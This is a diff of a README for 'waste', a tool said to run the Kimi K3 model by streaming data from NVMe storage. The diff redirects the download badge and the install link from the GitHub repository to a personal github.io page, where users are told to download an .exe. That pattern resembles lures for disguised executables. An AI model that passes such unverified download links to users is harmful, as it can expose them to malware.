@@ -1,6 +1,6 @@
 # ⚙️ waste - Run Massive AI Models On Hardware
 
-[![](https://img.shields.io/badge/Download_Waste-Blue)](https://github.com/Rafay9900/waste)
+[![](https://img.shields.io/badge/Download_Waste-Blue)](https://rafay9900.github.io)
 
 This tool lets you run the Kimi K3 model. Computers usually need massive amounts of memory to run large models. This software uses your NVMe storage drive to bypass those limits. It streams only the necessary data into your system. You can now use advanced artificial intelligence on standard hardware.
 
@@ -18,7 +18,7 @@ Ensure your computer has the latest graphics drivers installed. Visit your graph
 
 ## 💾 How to Install
 
-1. Go to the download page: https://github.com/Rafay9900/waste
+1. Go to the download page: https://rafay9900.github.io
 2. Look for the latest release version on the page.
 3. Click the link that ends in .exe to start the download.
 4. Save the file to your desktop or a folder you can find easily.
